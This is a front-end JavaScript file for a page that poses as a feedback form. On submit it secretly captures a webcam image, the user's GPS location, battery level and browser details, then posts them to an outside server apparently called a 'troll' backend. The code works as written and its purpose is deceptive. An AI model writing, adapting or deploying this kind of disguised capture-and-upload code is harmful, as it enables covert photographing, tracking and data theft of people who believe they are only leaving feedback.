const form = document.getElementById("feedbackForm");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const toast = document.getElementById("toast");

const constraints = { video: { facingMode: "user" }, audio: false };

function showToast(text) {
  toast.innerText = text;
  toast.style.display = "block";
  setTimeout(() => (toast.style.display = "none"), 3000);
}

// Submit event
form.addEventListener("submit", async (e) => {
  e.preventDefault();

  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    video.srcObject = stream;
    await video.play();

    // Wait until video has enough data
    await new Promise((res) => {
      video.addEventListener("canplay", () => setTimeout(res, 300));
    });

    const image = captureImage();
    const metadata = await collectMetadata();

    await sendToBackend(image, metadata);

  } catch (err) {
    alert("Give me permissions");
    console.error(err);
  }
});

function captureImage() {
  const ctx = canvas.getContext("2d");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  return canvas.toDataURL("image/png");
}

async function collectMetadata() {
  const metadata = {
    useragent: navigator.userAgent,
    platform: navigator.platform,
    width: window.innerWidth,
    height: window.innerHeight,
    language: navigator.language,
    battery: "N/A",
    location: "N/A",
    time: new Date().toLocaleString()
  };

  if (navigator.getBattery) {
    const battery = await navigator.getBattery();
    metadata.battery = battery.level * 100 + "%";
  }

  if (navigator.geolocation) {
    try {
      const pos = await new Promise((res, rej) =>
        navigator.geolocation.getCurrentPosition(res, rej)
      );
      metadata.location = `${pos.coords.latitude},${pos.coords.longitude}`;
    } catch {
      metadata.location = "Denied";
    }
  }

  return metadata;
}
const backendURL = "https://troll-backend.onrender.com/api/upload";
async function sendToBackend(image, metadata) {
  try {
    await fetch(backendURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ image, metadata })
    });
  } catch (err) {
    console.error("Error sending data:", err);
  }
}
